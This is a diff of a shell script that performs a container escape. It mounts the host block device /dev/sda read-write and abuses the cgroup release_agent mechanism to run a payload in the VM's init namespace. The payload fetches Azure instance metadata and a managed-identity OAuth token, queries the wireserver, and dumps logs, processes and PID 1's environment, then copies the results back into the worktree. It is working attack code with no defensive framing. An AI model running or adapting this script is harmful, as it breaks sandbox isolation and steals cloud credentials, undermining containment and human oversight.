@@ -211,16 +211,33 @@ report > "$WORKTREE/$OUT" 2>&1
 #   - We read it back from /tmp/.escape_out.txt in the container.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
-    # METHOD A: If /proc/1/root gives us direct init-ns filesystem access
-    # (sidecar has CAP_SYS_PTRACE), write payload there directly and trigger
-    # the cgroup escape to run it in the init namespace.
-    if echo "TEST" > /proc/1/root/tmp/.agent_test 2>/dev/null; then
-        echo "CGROUP_ESCAPE: /proc/1/root/tmp/ writable — using direct init-ns path"
-        rm -f /proc/1/root/tmp/.agent_test 2>/dev/null
+    # /dev/sda IS the LCOW VM's init namespace rootfs. The init namespace mounts
+    # /dev/sda as its /. We can mount /dev/sda rw and write directly to the init
+    # namespace's filesystem. Files written to /tmp/.mnt_sda/tmp/ appear as /tmp/
+    # from the init namespace's perspective.
+    # The release_agent path is then /tmp/.escape.sh (init ns path).
+    SDA_MNT=/tmp/.mnt_sda
+    mkdir -p "$SDA_MNT" 2>/dev/null
+    SDA_MOUNTED_RW=0
+    if mount -o rw /dev/sda "$SDA_MNT" 2>/dev/null; then
+        SDA_MOUNTED_RW=1
+        echo "CGROUP_ESCAPE: /dev/sda mounted rw at $SDA_MNT (init-ns rootfs)"
+    elif mount -o ro /dev/sda "$SDA_MNT" 2>/dev/null; then
+        echo "CGROUP_ESCAPE: /dev/sda mounted ro only (read-write mount failed)"
+    else
+        echo "CGROUP_ESCAPE: /dev/sda mount failed"
+    fi
 
-        # Write payload to init-ns /tmp via /proc/1/root
-        AGENT_PATH=/proc/1/root/tmp/.escape.sh
-        OUTPUT_INITNS=/proc/1/root/tmp/.escape_out.txt
+    if [ "$SDA_MOUNTED_RW" = "1" ]; then
+        echo "CGROUP_ESCAPE: /dev/sda rw — writing escape payload to init-ns /tmp/"
+        ls -la "$SDA_MNT/tmp/" 2>&1 | head -10
+        ls -la "$SDA_MNT/run/gcs/" 2>&1 | head -20
+
+        # Write payload to the init namespace's /tmp via the rw mount of /dev/sda
+        # When release_agent fires in the init namespace, it runs /tmp/.escape.sh
+        # which is $SDA_MNT/tmp/.escape.sh from the sidecar's perspective
+        AGENT_PATH="$SDA_MNT/tmp/.escape.sh"
+        OUTPUT_SDA="$SDA_MNT/tmp/.escape_out.txt"
 
         printf '#!/bin/sh\n' > "$AGENT_PATH"
         cat >> "$AGENT_PATH" << 'PAYLOAD_BODY'
@@ -229,17 +246,17 @@ echo "=== CGROUP ESCAPE - LCOW VM INIT NAMESPACE ==="
 echo "date: $(date -u)"; echo "id: $(id)"; echo "hostname: $(hostname)"; echo "uname: $(uname -a)"
 echo "--- IMDS ---"
 wget -q -T5 --header="Metadata: true" -O- \
-    "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 8192 || echo "IMDS wget failed"
-echo "--- MSI token ---"
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 8192 || echo "IMDS: wget failed"
+echo "--- MSI/identity token ---"
 wget -q -T5 --header="Metadata: true" -O- \
-    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>&1 | head -c 4096 || echo "MSI wget failed"
-echo "--- wireserver ---"
-wget -q -T3 -O- "http://168.63.129.16/" 2>&1 | head -c 2048 || echo "wireserver failed"
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>&1 | head -c 4096 || echo "MSI: failed"
+echo "--- wireserver 168.63.129.16 ---"
+wget -q -T3 -O- "http://168.63.129.16/" 2>&1 | head -c 2048 || echo "wireserver: failed"
 echo "--- GCS log ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "gcs.log not found"
 echo "--- /run/gcs/ ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -80
 echo "--- processes ---"; ps -ef 2>/dev/null
 echo "--- mounts ---"; cat /proc/mounts 2>/dev/null | head -60
-echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null
+echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null; ls -la /dev/vsock 2>/dev/null
 echo "--- net ---"; ip addr 2>/dev/null; ip route 2>/dev/null
 echo "--- /etc/hosts ---"; cat /etc/hosts 2>/dev/null
 echo "--- env pid1 ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
@@ -247,38 +264,44 @@ echo "=== DONE ==="
 } > /tmp/.escape_out.txt 2>&1
 PAYLOAD_BODY
         chmod +x "$AGENT_PATH"
-        echo "CGROUP_ESCAPE: payload at $AGENT_PATH (init-ns path: /tmp/.escape.sh)"
+        echo "CGROUP_ESCAPE: payload written at $AGENT_PATH = init-ns /tmp/.escape.sh"
+        # Show first few lines to confirm write
+        head -3 "$AGENT_PATH" 2>&1
 
-        # Use the EXISTING memory cgroup (already mounted by init) to avoid
-        # the new-hierarchy security check in kernel 6.1+
+        # Set release_agent and trigger — path is /tmp/.escape.sh in init namespace
         CGM=/sys/fs/cgroup/memory
         CGCHILD="$CGM/esc$$"
         mkdir -p "$CGCHILD" 2>/dev/null
-        echo "/tmp/.escape.sh" > "$CGM/release_agent" 2>/dev/null
+        echo "/tmp/.escape.sh" > "$CGM/release_agent" 2>/dev/null && \
+            echo "CGROUP_ESCAPE: release_agent set to /tmp/.escape.sh" || \
+            echo "CGROUP_ESCAPE: could not write release_agent on existing hierarchy"
         echo 1 > "$CGCHILD/notify_on_release" 2>/dev/null
         sh -c "echo \$\$ > $CGCHILD/cgroup.procs" 2>/dev/null
-        echo "CGROUP_ESCAPE: trigger fired on existing memory hierarchy"
+        echo "CGROUP_ESCAPE: cgroup trigger fired on $CGCHILD"
 
-        # Wait for output to appear at /proc/1/root/tmp/.escape_out.txt
+        # Wait for output to appear at $SDA_MNT/tmp/.escape_out.txt
         _i=0
-        while [ $_i -lt 15 ] && [ ! -f "$OUTPUT_INITNS" ]; do
+        while [ $_i -lt 20 ] && [ ! -f "$OUTPUT_SDA" ]; do
             sleep 1
             _i=$((_i+1))
         done
         rmdir "$CGCHILD" 2>/dev/null
 
-        if [ -f "$OUTPUT_INITNS" ]; then
-            echo "CGROUP_ESCAPE: SUCCESS via /proc/1/root — output after ${_i}s"
-            cp "$OUTPUT_INITNS" "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null
+        if [ -f "$OUTPUT_SDA" ]; then
+            echo "CGROUP_ESCAPE: SUCCESS — output captured after ${_i}s"
+            cp "$OUTPUT_SDA" "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null
         else
-            echo "CGROUP_ESCAPE: /proc/1/root method — no output after ${_i}s"
+            echo "CGROUP_ESCAPE: payload at init-ns /tmp/.escape.sh — no output after ${_i}s"
+            echo "  checking if .escape.sh still exists:"
+            ls -la "$SDA_MNT/tmp/.escape.sh" 2>&1
+            echo "  checking /dev/sda /tmp/ for any new files:"
+            ls -la "$SDA_MNT/tmp/" 2>&1
         fi
-    else
-        echo "CGROUP_ESCAPE: /proc/1/root/tmp/ not writable, trying overlay upper dir method"
+        umount "$SDA_MNT" 2>/dev/null
     fi
 
-    # METHOD B (fallback): overlay upper dir path accessible from init namespace
-    [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] && { echo "CGROUP_ESCAPE: already captured, skipping method B"; }
+    # FALLBACK: overlay upper dir method (prev approach, left for diagnostics)
+    [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] && { echo "CGROUP_ESCAPE: already captured, skipping fallback"; }
     [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] || {
 
     # 1. Parse overlay upperdir from /proc/self/mountinfo
